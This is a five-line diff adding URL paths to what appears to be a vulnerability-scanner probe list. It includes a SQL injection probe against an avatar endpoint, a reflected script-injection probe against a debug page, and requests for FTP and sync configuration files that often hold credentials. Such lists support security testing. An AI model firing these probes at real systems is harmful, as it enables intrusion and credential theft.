@@ -1,0 +1,5 @@
+/admin/ajax/avatar.php?id=-1+union+select+md5({{num}})%23
+/deployment-config.json
+/.remote-sync.json
+/.ftpconfig
+/widgets/debug.php?a=<script>alert(document.domain)</script>
